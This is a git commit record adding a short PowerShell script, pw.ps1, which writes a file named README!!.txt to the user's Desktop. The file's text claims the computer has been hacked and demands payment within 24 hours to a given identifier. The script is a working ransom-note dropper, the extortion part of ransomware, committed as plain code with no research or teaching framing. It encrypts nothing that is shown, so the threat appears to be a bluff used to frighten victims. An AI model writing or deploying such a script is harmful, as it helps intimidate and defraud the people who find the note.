71cebb6dff764fd5a614a422ed25639f95c84b1f
cheffloppa1 <chefseller8@gmail.com>
2024-09-30 18:15:10 +0300

    Add files via upload

---
+++ pw.ps1
@@ -0,0 +1,5 @@
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+
+$filePath = "$desktopPath\README!!.txt"
+
+"YOU HAVE BEEN HACKED, YOU GOT 24HOURS TO COMPLETE THE PAYMENT TO 34928DJSHAHR309!." | Out-File -FilePath $filePath
